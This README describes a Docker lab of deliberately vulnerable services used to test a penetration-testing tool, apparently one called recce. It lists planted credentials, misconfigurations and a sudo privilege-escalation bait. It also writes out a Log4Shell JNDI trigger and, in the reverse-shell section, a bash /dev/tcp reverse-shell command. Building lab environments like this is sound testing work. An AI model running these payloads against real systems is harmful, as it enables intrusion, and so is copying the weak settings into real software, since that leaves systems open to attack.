# recce test environment

A local multi-target lab on `172.20.0.0/24` for exercising every recce
scan module and every session-tab flow against realistic services with
documented CVEs and misconfigurations.

## Quick start

    cd test_env
    sudo docker compose up -d

First bring-up pulls ~2 GB of images and takes a few minutes. Cassandra
and the Samba DC are slow starters — give them ~60 s before running scans.

Once up:

    python3 -m recce enum 172.20.0.0/24 -o /tmp/lab --profile quick --all-ports
    python3 -m recce serve -o /tmp/lab --port 8443

Open <http://localhost:8443>.

## Compose profiles (Phase 9a)

The 29 base services (`.10`–`.49`) start on every `docker compose up`.
Nine new T5 targets (`.50`–`.58`) are opt-in via compose profiles so a
laptop bring-up stays fast:

    docker compose --profile core up --wait          # +dovecot dns ntp memcached mqtt vault rtsp
    docker compose --profile messaging up --wait     # +mqtt coap xmpp
    docker compose --profile mail up --wait          # +dovecot
    docker compose --profile databases up --wait     # +memcached
    docker compose --profile media up --wait         # +rtsp

The `--wait` flag blocks until each service's healthcheck reports
healthy — deterministic for CI. Multiple profiles compose:
`docker compose --profile core --profile messaging up --wait`.

## Network layout

| IP | Container | Service(s) | Notes |
|---|---|---|---|
| .10 | target-linux | SSH :22 + Python | Primary shell target — catches reverse shells, hosts the tunnel agent. `root:toor` / `testuser:password123`. **testuser has `NOPASSWD: /usr/bin/find`** (GTFOBins privesc bait). |
| .11 | web-target | HTTP :80 · HTTPS :443 · alt :8080 | plain nginx. |
| .12 | db-mysql | MySQL :3306 | `dbuser:dbpass123`, DB `testdb`, root `toor`. |
| .13 | smb-target | SMB :445 · NetBIOS :139 | Samba w/ open share for `credenum` / `smb`. |
| .14 | ftp-target | FTP :21 (PASV 21100-21110) | `ftpuser:ftppass123`. |
| .15 | mail-target | SMTP :25 (MailHog) | Sink for `smtp` enum. |
| .16 | win-sim | RDP-sim :3389 · WinRM-sim :5985 | ncat echoes — banner grabs land, no real Windows. |
| .17 | db-redis | Redis :6379 | `requirepass redis123`. |
| .18 | db-postgres | PostgreSQL :5432 | `pguser:pgpass123`, DB `testdb`. |
| **.19** | ldap-target | LDAP :389 · LDAPS :636 | Anonymous bind allowed. `readonly:readonly`. Admin `admin:ldap123`. Domain `recce.test`. |
| **.20** | snmp-target | SNMP :161/UDP | Community strings `public` / `private`. |
| **.21** | nfs-target | NFS :2049 · rpcbind :111 | `/nfsshare` world-mountable (privileged container needs kernel `nfsd`). |
| **.22** | mongo-target | MongoDB :27017 | `--noauth` — the classic critical exposure. |
| **.23** | es-target | Elasticsearch :9200 · :9300 | `xpack.security.enabled=false`. |
| **.24** | dind-target | Docker Engine :2375 | No TLS, no auth — never expose this off a lab net. |
| **.25** | dvwa | HTTP :80 | Damn Vulnerable Web App. Standard playground: SQLi / XSS / RCE / file upload. |
| **.26** | juice-shop | HTTP :3000 | OWASP Juice Shop — modern SPA + REST + GraphQL. |
| **.27** | log4shell | Solr Admin :8983 (+ JDWP :5005) | Vulhub Solr with CVE-2021-44228. Trigger: `/solr/admin/cores?action=${jndi:ldap://<host>/x}`. |
| **.28** | couch-target | CouchDB :5984 | Admin party — `admin:admin`. |
| **.29** | cassandra-tgt | Cassandra :9042 · gossip :7000 | `AllowAllAuthenticator`, no CQL creds. |
| **.30** | ad-dc | KDC :88 · LDAP :389/636 · SMB :445 · DNS :53 · GC :3268 | Samba as AD DC. Domain **CORP.LOCAL**. Admin `Administrator:Passw0rd!`. |
| **.50** | dovecot | IMAP :143 / IMAPS :993 · POP3 :110 / POP3S :995 | *T5, profile `core, mail`.* recce `imap` + `pop3` module targets. |
| **.51** | dns-bind | DNS :53 tcp+udp | *T5, profile `core`.* recce `dns` target. |
| **.52** | ntp-target | NTP :123/udp | *T5, profile `core`.* recce `ntp` (mode-6 readvar / peers / monlist / skew). |
| **.53** | memcached | :11211 | *T5, profile `core, databases`.* recce db/memcached probe. |
| **.54** | mqtt-broker | :1883 (anonymous, retained) | *T5, profile `core, messaging`.* recce `mqtt` module — CONNACK + retained-topic exfil. |
| **.55** | vault | :8200 (dev mode, root token `root`) | *T5, profile `core`.* recce `vault` — /sys/health + auth mounts. |
| **.56** | coap-target | :5683/udp (aiocoap file-server) | *T5, profile `messaging`.* recce `coap` — /.well-known/core discovery. |
| **.57** | xmpp-target | :5222 c2s · :5269 s2s · :5223 legacy TLS | *T5, profile `messaging`.* recce `xmpp` module. |
| **.58** | rtsp-target | :554 · :8554 (mediamtx) | *T5, profile `core, media`.* recce `rtsp` — OPTIONS/DESCRIBE (vendor-quirk tests remain integration-only per Phase 9 plan). |

**Bold rows** are the T1/T2/T3/T5 expansions I added; the un-bolded rows are the base test env.
**Italic notes** in the T5 rows call out which compose profile each service belongs to.

## Sample importer files

`test_env/samples/` — synthetic SharpHound + Certipy JSON that always
parses cleanly, no matter whether the live DC is up. Feed via
Add-menu → Import, or:

    python3 -m recce ad test_env/samples/sharphound-corp.zip -o /tmp/lab
    python3 -m recce ad test_env/samples/certipy-corp.json -o /tmp/lab

* `sharphound-corp.zip` — 5 users + 3 computers + 3 groups + 1 domain + 2 OUs.
  Produces 3 AD findings: unconstrained delegation on FILE01, kerberoastable
  `svc_sql`, AS-REP-roastable `legacy.app`.
* `certipy-corp.json` — 1 CA + 2 templates. Produces 4 ADCS findings:
  ESC1 + ESC8 (critical) + ESC3 + ESC11 (high).

## Recce module coverage

Every scan module in the catalog has at least one target that produces
real signal:

| Recce module | Target(s) | Expected output |
|---|---|---|
| `enum` / `scan` / `run` | any / all | port sweep + service enum |
| `vulns --aggressive` | .11 .25 .27 | Apache CVEs, Solr, log4shell |
| `nuclei` | .25 .26 | modern web templates |
| `web --crawl --sqli-time` | .25 .26 | forms, params, headers, admin paths |
| `api` | .26 | OpenAPI / REST enum |
| `smb` (creds optional) | .13 .30 | Samba shares, DC info |
| `ldap` / `credenum` | .19 .30 | schema walk + anon bind + DC enum |
| `snmp` | .20 | v1/v2c with default community |
| `nfs` / `showmount` | .21 | export enumeration |
| `mongodb` | .22 | unauthenticated exposure |
| `elasticsearch` | .23 | security-disabled cluster |
| `docker` | .24 | Engine API RCE surface |
| `couchdb` | .28 | admin-party |
| `cassandra` | .29 | AllowAll + UDF RCE |
| `postgres` (creds) | .18 | credentialed RCE plan |
| `mysql` (creds) | .12 | credentialed |
| `redis` | .17 | AUTH-protected |
| `ftp` (creds optional) | .14 | login + listing |
| `smtp` | .15 | MailHog banner |
| `kerberos` / `asrep` / `kerberoast` | .30 | live KDC |
| `ad` (import) | samples/ + .30 | SharpHound + Certipy fold-in |
| `certipy` (Sprint C bridge) | .30 | live ADCS enumeration |

## Reverse-shell testing

The reliable path for Sessions-tab testing:

    # Start listener via UI or:
    curl -X POST http://localhost:8443/api/listeners \
      -H 'Content-Type: application/json' -d '{"port":4444}'

    # Fire a reverse shell from a container back to the docker gateway:
    sudo docker exec test_env-target-linux-1 \
      bash -c 'bash -i >& /dev/tcp/172.20.0.1/4444 0>&1' &

    # A new session lands with an adjective+animal name (e.g. STORMY_BEAR).
    # Quick-action buttons in the Sessions tab: whoami / id / sudo -l /
    # hostname / uname / os / ifconfig / ps / netstat.

The `NOPASSWD: /usr/bin/find` bait on `testuser` gives `sudo -l` a real
exploitable row so privesc/quick-action flows return meaningful output.

## Runtime notes

* **First bring-up is slow.** ~2 GB of images. Cassandra and the DC take ~60 s
  to be fully ready even after the container is "up".
* **NFS + DinD need `privileged: true`** for kernel-module loading (nfsd) and
  nested docker respectively. This is expected — the lab is not a production
  reference.
* **Samba DC (`nowsci/samba-domain`) can be picky.** If it doesn't come up
  cleanly on your host (DNS conflicts / kernel mods), the sample files in
  `samples/` cover the same testing surface without needing the live DC.
* **Elasticsearch wants heap.** The compose file caps it at 512 MB via
  `ES_JAVA_OPTS`. If you're on a small laptop, comment out `es-target` or
  the whole thing OOMs.

## Teardown

    sudo docker compose down -v   # -v also removes volumes (nfs-share)

## What's tracked vs ignored

Everything in `test_env/` except `.env*`, `*.log`, `data/`, `volumes/` is
committed to git. That means the compose file, Dockerfiles, sample AD data,
and this README travel with the repo. Operator-local runtime state doesn't.
